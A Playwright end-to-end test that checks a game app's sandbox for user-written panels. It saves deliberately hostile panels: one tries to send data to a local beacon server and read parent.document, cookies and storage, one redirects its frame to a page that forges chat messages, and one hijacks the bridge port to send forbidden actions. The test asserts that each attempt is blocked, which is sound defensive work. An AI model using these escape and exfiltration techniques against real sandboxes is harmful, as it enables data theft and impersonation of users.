/**
 * The stored-panel sandbox against the LIVE local engine (`pnpm --filter @workspace/engine dev`), ported from v1's
 * e2e/stored-panels.ts (archive/engine-v1). carol plays a practice game; her panels are saved through `panel.save` as
 * herself and opened from "Your panels". Checks, each printed ok / FAIL:
 *   the frame is sandboxed (allow-scripts only) and shows live data over the bridge; moving its pane does not restart
 *   the frame; it still runs when its frame CSP names another site origin (a custom domain); a hostile panel gets
 *   nothing (no fetch, no parent.document, no cookies or storage, no image/style/script/WebSocket beacons: a local
 *   beacon server sees no request); a panel that navigates its own frame away is stopped, and the page it loads hears
 *   nothing from the bridge (with and without the page's CSP); ?panels=off runs no panel; the page reports no CSP
 *   violation of its own; no uncaught page errors.
 *
 *   pnpm --filter @workspace/player-web run e2e:panel-security        (SKIP_DEPLOY=1 reuses the uploaded build)
 */
import "../../engine/scripts/local-only.mjs";
import { spawnSync } from "node:child_process";
import { mkdirSync } from "node:fs";
import { createServer } from "node:http";
import { createRequire } from "node:module";
import path from "node:path";
import { ConvexHttpClient } from "convex/browser";

const require = createRequire(import.meta.url);
const { chromium } = require("playwright");
type Page = any;

const SITE = process.env.CODE_GODS_SITE_URL ?? `http://127.0.0.1:${process.env.CONVEX_LOCAL_SITE_PORT ?? "3211"}`;
const CLOUD = `http://127.0.0.1:${process.env.CONVEX_LOCAL_CLOUD_PORT ?? "3210"}`;
const ROOT = path.resolve(import.meta.dirname, "../../..");
const SHOTS = process.env.SHOTS_DIR ?? path.join(import.meta.dirname, "shots");
mkdirSync(SHOTS, { recursive: true });

const results: { name: string; ok: boolean; detail?: string }[] = [];
async function check(name: string, run: () => Promise<unknown>) {
  try { await run(); results.push({ name, ok: true }); console.log(`ok   ${name}`); }
  catch (error) { const detail = (error as Error).message.split("\n")[0]; results.push({ name, ok: false, detail }); console.log(`FAIL ${name}: ${detail}`); }
}
function assert(condition: unknown, message: string): asserts condition { if (!condition) throw new Error(message); }
const sleep = (ms: number) => new Promise(r => setTimeout(r, ms));

if (!(await fetch(`${SITE}/api/health`).then(r => r.ok, () => false))) {
  console.error(`No engine at ${SITE}. Start one: pnpm --filter @workspace/engine dev`);
  process.exit(1);
}
if (!process.env.SKIP_DEPLOY) {
  const deploy = spawnSync("pnpm", ["--filter", "@workspace/engine", "run", "deploy-static"], { cwd: ROOT, stdio: "inherit" });
  assert(deploy.status === 0, "deploy-static failed");
}

// A beacon server: any request reaching it is a leak. /nav is a page a panel may navigate its own frame to: it speaks
// the v2 bridge with the nonce it was handed (a second `ready`, a watch, a chat as the player) and reports anything it
// hears back to /got.
const hits: string[] = [];
const NAV_PAGE = `<!doctype html><script>
const nonce = new URLSearchParams(location.hash.slice(1)).get("n");
addEventListener("message", e => { fetch("/got?" + encodeURIComponent(JSON.stringify(e.data).slice(0, 200))); });
parent.postMessage({ type: "ready", sdk: 2, nonce }, "*");
parent.postMessage({ type: "watch", id: "x", hook: "useMe", args: [], nonce }, "*");
parent.postMessage({ type: "act", id: "c", op: "chat.send", args: { text: "FORGED-BY-NAVIGATED-PAGE" }, nonce }, "*");
</script>`;
const beacon = createServer((req, res) => {
  hits.push(req.url ?? "");
  if (req.url?.startsWith("/nav")) { res.setHeader("content-type", "text/html"); res.end(NAV_PAGE); } else res.end("leak");
});
await new Promise<void>(r => beacon.listen(0, "127.0.0.1", r));
const BEACON = `http://127.0.0.1:${(beacon.address() as { port: number }).port}`;

async function signIn(context: any, who: string) {
  const page = await context.newPage();
  await page.goto(`${SITE}/`);
  await page.getByTestId("button-login").waitFor();
  const url = await page.evaluate(async () => {
    const r = await fetch("/api/auth/sign-in/oauth2", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ providerId: "fake", callbackURL: "/" }) });
    return ((await r.json()) as { url: string }).url;
  });
  await page.goto(url);
  await page.getByRole("link", { name: new RegExp(`\\(${who}\\)`) }).click();
  await page.waitForURL(`${SITE}/`);
  await page.getByTestId("button-avatar").waitFor();
  return page;
}

const browser = await chromium.launch();
const context = await browser.newContext({ viewport: { width: 1440, height: 900 }, deviceScaleFactor: 1 });
const page: Page = await signIn(context, "carol");
const pageErrors: string[] = [];
const cspReports: string[] = [];
page.on("pageerror", (e: Error) => pageErrors.push(e.message));
// The host page's own CSP reports (the frames' refusals are expected: the hostile panel provokes them).
page.on("console", (m: any) => { if (/Content Security Policy/i.test(m.text()) && !/panel-(runtime|frame)|^panel:/.test(m.location().url)) cspReports.push(`${m.location().url}: ${m.text()}`); });

const token = await page.evaluate(async () => ((await (await fetch("/api/auth/convex/token")).json()) as { token: string }).token);
const carol = new ConvexHttpClient(CLOUD);
carol.setAuth(token);
type Out = { ok: boolean; result?: any; error?: { message: string } };
async function op(kind: "mutation" | "action", name: string, args: Record<string, unknown>) {
  const out = await (carol as any)[kind](name, { args }) as Out;
  assert(out.ok, `${name}: ${out.error?.message}`);
  return out.result;
}
const save = async (slug: string, source: string) => {
  const r = await op("action", "v2/ops/panel:save", { slug, source, title: slug });
  assert(r.saved, `${slug} not saved: ${JSON.stringify(r.diagnostics)}`);
  return r.version as number;
};
// Earlier runs' panels (at most 32 per player).
for (const p of (await carol.query("v2/ops/panel:list" as never, { args: {} } as never) as Out).result?.panels ?? []) {
  if (String(p.slug).startsWith("sec-")) await op("mutation", "v2/ops/panel:remove", { slug: p.slug });
}

await page.getByTestId("button-create-room").first().click();
await page.waitForURL(/\/rooms\/[A-Z0-9]+$/);
await page.getByTestId("button-practice-game").click();
await page.waitForURL(/\/games\//, { timeout: 30_000 });
const GAME = new URL(page.url()).pathname;
await page.getByTestId("dock").waitFor({ timeout: 60_000 });
await page.evaluate(() => { (window as unknown as { __cgMarker: number }).__cgMarker = 42; });
const sameDocument = () => page.evaluate(() => (window as unknown as { __cgMarker?: number }).__cgMarker === 42);

/** Opens "Your panels" (a pane's menu) if it is not docked, then the panel as a pane. */
async function openPanel(p: Page, slug: string) {
  const mine = p.getByTestId("pane-my-panels");
  // Docked as a tab behind another pane: bring it to the front.
  if (!await mine.count() && await p.getByTestId("tab-my-panels").count()) {
    await p.getByTestId("tab-my-panels").click();
    await mine.waitFor({ timeout: 10_000 });
  }
  if (!await mine.count()) {
    await p.locator("[data-testid^=button-pane-menu-]").first().click();
    await p.getByTestId("button-open-pane-my-panels").click({ timeout: 10_000 }).catch(async (e: Error) => {
      await p.screenshot({ path: path.join(SHOTS, `security-menu-${slug}.png`) });
      throw new Error(`no "Your panels" in the menu (${e.message.split("\n")[0]}); the dock: ${await p.getByTestId("dock-desktop").getAttribute("data-dock").catch(() => "?")}`);
    });
  }
  await mine.getByTestId(`row-panel-${slug}`).waitFor({ state: "attached", timeout: 30_000 }).catch(async (e: Error) => {
    await p.screenshot({ path: path.join(SHOTS, `security-open-${slug}.png`) });
    throw new Error(`${slug} is not listed in "Your panels" (${e.message.split("\n")[0]}); the dock: ${await p.getByTestId("dock-desktop").getAttribute("data-dock").catch(() => "?")}`);
  });
  await mine.getByTestId(`button-panel-open-${slug}`).click({ timeout: 30_000 });
  await p.getByTestId(`panel-frame-${slug}`).waitFor({ timeout: 30_000 });
}
const frame = (p: Page, slug: string) => p.frameLocator(`[data-testid="panel-frame-${slug}"] iframe`);
async function frameShows(p: Page, slug: string, testId: string, expected: RegExp) {
  const end = Date.now() + 30_000;
  for (;;) {
    const text = await frame(p, slug).locator(`[data-testid=${testId}]`).textContent({ timeout: 5_000 }).catch(() => null);
    if (text && expected.test(text)) return text;
    if (Date.now() > end) throw new Error(`${slug}: ${testId} shows ${JSON.stringify(text)}, expected ${expected}`);
    await sleep(250);
  }
}

const LIVE = `import { definePanel, useGame, useMe } from "@sdk";
export default definePanel({ title: "Live", Component() {
  const game = useGame();
  const me = useMe();
  return <p data-testid="sp-text">{game && me !== undefined ? "phase " + game.phase : "loading"}</p>;
} });
`;

await check("a stored panel runs sandboxed (allow-scripts only) with live data over the bridge, without a reload", async () => {
  await save("sec-live", LIVE);
  await openPanel(page, "sec-live");
  await frameShows(page, "sec-live", "sp-text", /^phase \w+$/);
  assert(await page.getAttribute('[data-testid="panel-frame-sec-live"] iframe', "sandbox") === "allow-scripts", "sandbox attribute");
  assert(await sameDocument(), "the page reloaded");
});

await check("moving a panel's pane does not restart its frame", async () => {
  const pane = "panel:sec-live";
  await frame(page, "sec-live").locator("body").evaluate(() => { (window as unknown as { __mark: number }).__mark = 7; });
  for (const place of ["Move to the left", "Move to the right"]) {
    await page.getByTestId(`button-pane-menu-${pane}`).click();
    await page.getByRole("option", { name: place }).click();
    await sleep(1500);
  }
  assert(await page.getByTestId("stored-panel-stopped").count() === 0, "the moved frame was stopped as a navigation");
  await frameShows(page, "sec-live", "sp-text", /^phase \w+$/);
  const kept = await frame(page, "sec-live").locator("body").evaluate(() => (window as unknown as { __mark?: number }).__mark);
  assert(kept === 7, `the frame's document was replaced (mark ${kept})`);
});

await check("a panel still runs when its frame CSP names another site origin (a custom domain)", async () => {
  // A document served through route.fulfill has no address, so Chromium's local-network checks would block its
  // loopback runtime: this browser runs without them.
  const lax = await chromium.launch({ args: ["--disable-features=LocalNetworkAccessChecks"] });
  const custom = await signIn(await lax.newContext(), "carol");
  const log: string[] = [];
  custom.on("console", (m: any) => log.push(m.text().slice(0, 200)));
  let rewritten = false;
  await custom.route((url: URL) => url.pathname.endsWith("/panel-frame.html"), async (route: any) => {
    const response = await route.fetch();
    const body = (await response.text()).replaceAll(new URL(SITE).origin, "https://custom-domain.example");
    rewritten = body.includes("https://custom-domain.example");
    await route.fulfill({ response, body });
  });
  await custom.goto(`${SITE}${GAME}`);
  await frameShows(custom, "sec-live", "sp-text", /^phase \w+$/);
  assert(rewritten, "the frame CSP does not name the site origin");
  assert(!log.some(t => /Content Security Policy/i.test(t)), `CSP refused the runtime: ${log.join(" | ")}`);
  await lax.close();
});

await check("a hostile panel gets nothing: no fetch, no parent.document, no cookies or storage, no beacons", async () => {
  hits.length = 0;
  await save("sec-hostile", `import { useEffect, useState } from "react";
import { definePanel } from "@sdk";
const BEACON = ${JSON.stringify(BEACON)};
export default definePanel({ title: "Hostile", Component() {
  const [r, setR] = useState<Record<string, string>>({});
  useEffect(() => {
    const set = (k: string, v: string) => setR(x => ({ ...x, [k]: v }));
    fetch("/api/health").then(() => set("fetch", "LEAK"), () => set("fetch", "blocked"));
    fetch(BEACON + "/fetch").then(() => set("fetchBeacon", "LEAK"), () => set("fetchBeacon", "blocked"));
    try { set("parent", "LEAK " + (parent as Window).document.title); } catch { set("parent", "blocked"); }
    try { set("top", "LEAK " + (top as Window).location.href); } catch { set("top", "blocked"); }
    try { set("cookie", document.cookie ? "LEAK" : "empty"); } catch { set("cookie", "blocked"); }
    try { localStorage.getItem("x"); set("storage", "LEAK"); } catch { set("storage", "blocked"); }
    try { indexedDB.open("x").onsuccess = () => set("idb", "LEAK"); } catch { set("idb", "blocked"); }
    const img = new Image(); img.onload = () => set("img", "LEAK"); img.onerror = () => set("img", "blocked"); img.src = BEACON + "/img";
    const css = document.createElement("link"); css.rel = "stylesheet"; css.href = BEACON + "/css"; document.head.appendChild(css);
    const js = document.createElement("script"); js.src = BEACON + "/js"; document.head.appendChild(js);
    try { new WebSocket(BEACON.replace("http", "ws") + "/ws"); } catch { /* blocked */ }
    try { navigator.sendBeacon(BEACON + "/beacon", "x"); } catch { /* blocked */ }
    try { window.open(BEACON + "/open"); } catch { /* blocked */ }
    try { (parent as Window).postMessage({ type: "watch", id: "evil", hook: "useMe", args: [] }, "*"); } catch { /* no nonce: dropped */ }
  }, []);
  return <pre data-testid="sp-hostile">{JSON.stringify(r)}</pre>;
} });
`);
  await openPanel(page, "sec-hostile");
  const text = await frameShows(page, "sec-hostile", "sp-hostile", /"img":/);
  const r = JSON.parse(text) as Record<string, string>;
  for (const key of ["fetch", "fetchBeacon", "parent", "top", "storage", "img"]) assert(r[key] === "blocked", `${key}: ${r[key]} (${text})`);
  assert(r.cookie !== "LEAK" && r.idb !== "LEAK", `cookie/idb: ${text}`);
  await sleep(1500);
  assert(hits.length === 0, `the beacon server was reached: ${hits.join(", ")}`);
  assert(await sameDocument(), "the page reloaded");
});

const NAVIGATES = `import { useEffect } from "react";
import { definePanel } from "@sdk";
export default definePanel({ title: "Navigates", Component() {
  useEffect(() => { const t = setTimeout(() => { location.href = ${JSON.stringify(BEACON)} + "/nav" + location.hash; }, 300); return () => clearTimeout(t); }, []);
  return <p>leaving</p>;
} });
`;

await check("a panel that navigates its own frame away is stopped; the page it loads hears nothing from the bridge", async () => {
  // The frame's own CSP cannot stop it navigating itself; the page's `frame-src 'self'` does. Without any page CSP,
  // the page the frame loads must still hear nothing: it does not own the bridge's MessagePort (defence in depth).
  hits.length = 0;
  await save("sec-navigates", NAVIGATES);
  await openPanel(page, "sec-navigates");
  const stopped = page.getByTestId("pane-panel:sec-navigates").getByTestId("stored-panel-stopped");
  await stopped.waitFor({ timeout: 30_000 });
  assert(/loaded another page/.test(await stopped.textContent() ?? ""), "stopped message");
  await sleep(2000);
  assert(!hits.some(h => h.startsWith("/nav")), "the navigation reached its target despite the page's frame-src");
  assert(!hits.some(h => h.startsWith("/got")), "the navigated page heard the bridge");

  const lax = await chromium.launch({ args: ["--disable-features=LocalNetworkAccessChecks"] });
  const bare = await signIn(await lax.newContext(), "carol");
  await bare.route((url: URL) => url.pathname === GAME, async (route: any) => {
    const response = await route.fetch();
    await route.fulfill({ response, body: (await response.text()).replace(/<meta http-equiv="Content-Security-Policy"[^>]*>/, "") });
  });
  await bare.goto(`${SITE}${GAME}`);
  assert(await bare.locator('meta[http-equiv="Content-Security-Policy"]').count() === 0, "the page CSP was not stripped");
  await bare.getByTestId("pane-panel:sec-navigates").getByTestId("stored-panel-stopped").waitFor({ timeout: 60_000 });
  await sleep(2500);
  assert(hits.some(h => h.startsWith("/nav")), `without the page CSP the frame should have navigated: ${hits.join(", ")}`);
  const heard = hits.filter(h => h.startsWith("/got"));
  assert(heard.length === 0, `the navigated page heard: ${heard.map(decodeURIComponent).join(" | ")}`);
  await lax.close();
  await op("mutation", "v2/ops/panel:remove", { slug: "sec-navigates" });
});

await check("?panels=off runs no panel: the panes say safe mode, the built-ins still load", async () => {
  const safe = await context.newPage();
  safe.on("pageerror", (e: Error) => pageErrors.push(`safe: ${e.message}`));
  await safe.goto(`${SITE}${GAME}?panels=off`);
  await safe.getByTestId("text-safe-mode").waitFor({ timeout: 60_000 });
  await safe.getByTestId("pane-panel:sec-live").getByTestId("stored-panel-safe-mode").waitFor({ state: "attached", timeout: 30_000 }).catch(async (e: Error) => {
    await safe.screenshot({ path: path.join(SHOTS, "security-safe-mode.png") });
    throw new Error(`${e.message.split("\n")[0]}; the dock: ${await safe.getByTestId("dock-desktop").getAttribute("data-dock").catch(() => "?")}`);
  });
  await sleep(1500);
  assert(await safe.locator("iframe").count() === 0, "a panel frame loaded in safe mode");
  assert(await safe.locator("[data-testid^=button-pane-menu-]").count() >= 2, "no built-in panes in safe mode");
  // The palette leaves safe mode: the page reloads without ?panels=off and the panel runs again.
  await safe.keyboard.press("Control+K");
  await safe.getByTestId("input-palette").fill("Leave safe mode");
  await safe.keyboard.press("Enter");
  await safe.waitForURL((u: URL) => !u.search.includes("panels=off"), { timeout: 30_000 });
  await frameShows(safe, "sec-live", "sp-text", /^phase \w+$/);
  await safe.close();
});

await check("the palette opens a panel of yours by its title, and turns safe mode on", async () => {
  await page.getByTestId("pane-my-panels").waitFor({ state: "attached" }).catch(() => {});
  await page.getByTestId("button-pane-menu-panel:sec-hostile").click();
  await page.getByTestId("button-close-pane-panel:sec-hostile").click();
  await page.getByTestId("panel-frame-sec-hostile").waitFor({ state: "detached", timeout: 20_000 });
  await page.keyboard.press("Control+K");
  await page.getByTestId("input-palette").fill("Open your panel: sec-hostile");
  await page.keyboard.press("Enter");
  await page.getByTestId("panel-frame-sec-hostile").waitFor({ state: "attached", timeout: 20_000 });
  const other = await context.newPage();
  await other.goto(`${SITE}${GAME}`);
  await other.getByTestId("dock").waitFor({ timeout: 60_000 });
  await other.keyboard.press("Control+K");
  await other.getByTestId("input-palette").fill("Safe mode: your panels off");
  await other.keyboard.press("Enter");
  await other.waitForURL((u: URL) => u.search.includes("panels=off"), { timeout: 30_000 });
  await other.getByTestId("text-safe-mode").waitFor({ timeout: 60_000 });
  await other.close();
});

const ROOM_CODE = GAME.split("/")[2]!;
const chatTexts = async () => {
  const { roomId } = await carol.query("v2/rooms:byCode" as never, { code: ROOM_CODE } as never) as { roomId: string };
  const out = await carol.query("v2/ops/chat:list" as never, { args: { limit: 50 }, roomId } as never) as Out;
  assert(out.ok, `chat.list: ${out.error?.message}`);
  return (out.result.page as { text: string }[]).map(m => m.text);
};

await check("a navigated frame's forged action did nothing", async () => {
  assert(!(await chatTexts()).includes("FORGED-BY-NAVIGATED-PAGE"), "the navigated page chatted as the player");
});

await check("a chat from a panel shows the app's confirmation with exactly what it sends; nothing is sent until confirmed", async () => {
  const TEXT = `hello from a stored panel ${Date.now()}`;
  await save("sec-chat", `import { useState } from "react";
import { definePanel, useActions } from "@sdk";
export default definePanel({ title: "Chatty", Component() {
  const actions = useActions();
  const [r, setR] = useState("idle");
  const show = (x: { ok: boolean; error?: { code: string; message: string } }) => setR(x.ok ? "accepted" : x.error!.code + " " + x.error!.message);
  return <div>
    <button data-testid="sp-chat" onClick={() => { setR("waiting"); actions.chat(${JSON.stringify(TEXT)}).then(show); }}>chat</button>
    <span data-testid="sp-chat-result">{r}</span>
  </div>;
} });
`);
  await openPanel(page, "sec-chat");
  const chatted = async () => (await chatTexts()).includes(TEXT);
  const fr = frame(page, "sec-chat");
  await fr.getByTestId("sp-chat").click({ timeout: 30_000 });
  const dialog = page.getByTestId("dialog-panel-action");
  await dialog.waitFor({ timeout: 15_000 });
  const payload = await page.getByTestId("text-panel-action-payload").textContent();
  assert(payload?.includes(TEXT) && payload.includes('"operation": "chat.send"'), `payload: ${payload}`);
  await sleep(1500);
  assert(!(await chatted()), "the chat was sent before the player confirmed");
  await page.getByTestId("button-panel-action-cancel").click();
  await frameShows(page, "sec-chat", "sp-chat-result", /^declined The player declined/);
  assert(!(await chatted()), "a cancelled chat was sent");

  await fr.getByTestId("sp-chat").click();
  await dialog.waitFor({ timeout: 15_000 });
  await page.waitForSelector("[data-testid=dialog-panel-action][data-armed=true]", { timeout: 5_000 });
  await page.getByTestId("button-panel-action-always").click();
  await frameShows(page, "sec-chat", "sp-chat-result", /^accepted$/);
  assert(await chatted(), "the confirmed chat did not arrive");

  // Let to act without asking: the next one runs at once, with no dialog.
  await fr.getByTestId("sp-chat").click();
  await frameShows(page, "sec-chat", "sp-chat-result", /^(accepted|refused .*)$/);
  assert(await dialog.count() === 0, "a granted panel was asked again");

  // "Ask before it acts" in Your panels takes the grant back: the next one asks again.
  const mine = page.getByTestId("pane-my-panels");
  if (!await mine.count() && await page.getByTestId("tab-my-panels").count()) { await page.getByTestId("tab-my-panels").click(); await mine.waitFor(); }
  await mine.getByTestId("button-panel-revoke-sec-chat").click();
  await fr.getByTestId("sp-chat").click();
  await dialog.waitFor({ timeout: 15_000 });
  await page.getByTestId("button-panel-action-cancel").click();
  await frameShows(page, "sec-chat", "sp-chat-result", /^declined/);
});

await check("a panel that grabs its bridge port and sends raw actions is checked by the app: off-list and extra arguments refused", async () => {
  await save("sec-overreach", `import { useEffect, useState } from "react";
import { definePanel, useActions } from "@sdk";
export default definePanel({ title: "Overreach", Component() {
  const actions = useActions();
  const [r, setR] = useState<Record<string, string>>({});
  useEffect(() => {
    // Capture the bridge's port as the SDK uses it (the one an act goes out on: React's scheduler posts on a port too),
    // then speak the protocol directly.
    const nonce = new URLSearchParams(location.hash.slice(1)).get("n");
    const original = MessagePort.prototype.postMessage;
    let port: MessagePort | null = null;
    MessagePort.prototype.postMessage = function (this: MessagePort, ...a: any[]) { if (a[0]?.type === "act") port = this; return (original as any).apply(this, a); };
    setR({ started: "yes" });
    void actions.check("typescript", "export default {}").then(o => {
      setR(x => ({ ...x, checked: o.ok ? "ok" : o.error.code }));
      MessagePort.prototype.postMessage = original;
      if (!port) { setR({ port: "none" }); return; }
      const p: MessagePort = port;
      const prev = p.onmessage;
      p.onmessage = e => { (prev as any)?.call(p, e); const m = e.data as any; if (m.type === "acted" && String(m.id).startsWith("x")) setR(x => ({ ...x, [m.id]: m.outcome.ok ? "RAN" : m.outcome.error.code })); };
      const raw = (id: string, op: string, args: unknown) => p.postMessage({ type: "act", id, op, args, nonce });
      raw("x-save", "panel.save", { slug: "sec-planted", source: "export default 1" });
      raw("x-leave", "room.leave", {});
      raw("x-scope", "chat.send", { text: "scoped", roomId: "elsewhere" });
      raw("x-proto", "__proto__", {});
    });
  }, []);
  return <pre data-testid="sp-overreach">{JSON.stringify(r)}</pre>;
} });
`);
  await openPanel(page, "sec-overreach");
  const text = await frameShows(page, "sec-overreach", "sp-overreach", /"x-proto"/).catch(async (e: Error) => {
    throw new Error(`${e.message}; frame state ${await page.getAttribute('[data-testid="panel-frame-sec-overreach"]', "data-frame-state").catch(() => "?")}; failed ${await page.getByTestId("panel-failed-sec-overreach").textContent().catch(() => "")}`);
  });
  const r = JSON.parse(text) as Record<string, string>;
  for (const id of ["x-save", "x-leave", "x-scope", "x-proto"]) assert(r[id] === "refused", `${id}: ${r[id]} (${text})`);
  assert(r.checked === "ok", `actions.check, an allowed read, works from a panel: ${r.checked}`);
  const listed = (await carol.query("v2/ops/panel:list" as never, { args: {} } as never) as Out).result.panels as { slug: string }[];
  assert(!listed.some(p => p.slug === "sec-planted"), "the panel saved a panel");
  assert(await page.getByTestId("dialog-panel-action").count() === 0, "an off-list action reached the player's confirmation");
});

await check("the page runs under its CSP without violations of its own", async () => {
  const csp = await page.getAttribute('meta[http-equiv="Content-Security-Policy"]', "content");
  assert(csp?.includes("frame-src 'self'"), `page CSP: ${csp}`);
  // Expected: the navigating panel's frame was refused by frame-src (checked above).
  const own = cspReports.filter(t => !t.includes(`${BEACON}/`));
  assert(own.length === 0, own.slice(0, 2).join(" | "));
});

await check("no uncaught page errors in the host", async () => assert(pageErrors.length === 0, pageErrors.slice(0, 3).join(" | ")));

for (const slug of ["sec-live", "sec-hostile", "sec-navigates", "sec-chat", "sec-overreach", "sec-planted"]) await op("mutation", "v2/ops/panel:remove", { slug }).catch(() => {});
await browser.close();
beacon.close();
const failed = results.filter(r => !r.ok);
console.log(`\n${results.length - failed.length}/${results.length} checks passed`);
process.exit(failed.length ? 1 : 0);
